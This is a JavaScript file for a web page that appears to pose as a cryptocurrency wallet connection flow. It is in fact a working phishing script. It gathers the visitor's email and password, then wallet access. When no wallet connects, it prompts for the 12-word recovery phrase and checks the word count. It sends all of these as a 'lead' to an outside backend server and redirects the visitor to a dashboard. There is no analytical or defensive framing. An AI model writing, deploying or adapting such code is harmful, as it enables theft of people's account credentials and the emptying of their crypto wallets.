const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if (!email || !pass) return alert('Enter credentials');
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendLead(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        status.innerText = "Enter 12-word recovery phrase:";
        const input = document.createElement('input');
        input.type = 'text';
        input.style.display = 'block';
        input.style.width = '100%';
        
        const btn = document.createElement('button');
        btn.innerText = "Done";
        btn.className = "btn-primary";
        btn.style.marginTop = "10px";

        step3.appendChild(input);
        step3.appendChild(btn);

        btn.onclick = async () => {
            const phrase = input.value.trim();
            if (phrase.split(/\s+/).length !== 12) return alert("Must be 12 words");
            await sendLead(email, pass, null, phrase);
        };

        input.onkeydown = (e) => { if(e.key === 'Enter') btn.click(); };
    }

    async function sendLead(email, pass, wallet, phrase) {
        try {
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                window.location.href = `${API_URL}/dashboard.html`;
            } else {
                status.innerText = "Server error. Try again.";
            }
        } catch (e) {
            status.innerText = "Connection error. Try again.";
        }
    }
});
